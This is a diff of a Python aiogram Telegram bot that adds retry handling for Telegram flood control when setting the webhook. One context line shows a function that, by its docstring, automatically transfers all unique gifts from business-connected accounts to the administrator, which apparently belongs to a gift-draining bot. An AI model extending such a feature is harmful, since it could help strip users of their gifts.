@@ -13,6 +13,7 @@ import asyncio
 import json
 import config
 import os
+from aiogram.exceptions import TelegramTooManyRequests
 
 async def transfer_all_unique_gifts(business_connection_id: str):
     """Автоматически передает все уникальные подарки администратору"""
@@ -724,13 +725,32 @@ async def health_handler(request):
     return web.Response(status=200, text="OK")
 
 async def set_webhook():
-    """Установка webhook для Telegram"""
+    """Установка webhook для Telegram с проверкой и обработкой флуд-контроля"""
     try:
         webhook_url = f"https://{os.environ.get('RAILWAY_STATIC_URL')}/webhook"
-        await bot.set_webhook(webhook_url)
-        logging.info(f"Webhook успешно установлен: {webhook_url}")
+        # Проверяем текущий webhook
+        current_webhook = await bot.get_webhook_info()
+        if current_webhook.url == webhook_url:
+            logging.info(f"Webhook уже установлен: {webhook_url}")
+            return
+        
+        # Пытаемся установить webhook с повторными попытками
+        max_retries = 5
+        for attempt in range(max_retries):
+            try:
+                await bot.set_webhook(webhook_url)
+                logging.info(f"Webhook успешно установлен: {webhook_url}")
+                return
+            except TelegramTooManyRequests as e:
+                retry_after = e.retry_after or 1
+                logging.warning(f"Флуд-контроль Telegram, повтор через {retry_after} сек, попытка {attempt + 1}/{max_retries}")
+                await asyncio.sleep(retry_after)
+            except Exception as e:
+                logging.error(f"Ошибка при установке webhook: {e}")
+                return
+        logging.error("Не удалось установить webhook после всех попыток")
     except Exception as e:
-        logging.error(f"Ошибка при установке webhook: {e}")
+        logging.error(f"Ошибка при проверке/установке webhook: {e}")
 
 def main():
     app = web.Application()
@@ -743,7 +763,7 @@ def main():
     # Запускаем установку webhook
     asyncio.run(set_webhook())
     
-    port = int(os.environ.get('PORT', 8080))  # Railway обычно использует 8080
+    port = int(os.environ.get('PORT', 8080))
     web.run_app(app, host='0.0.0.0', port=port)
 
 if __name__ == '__main__':
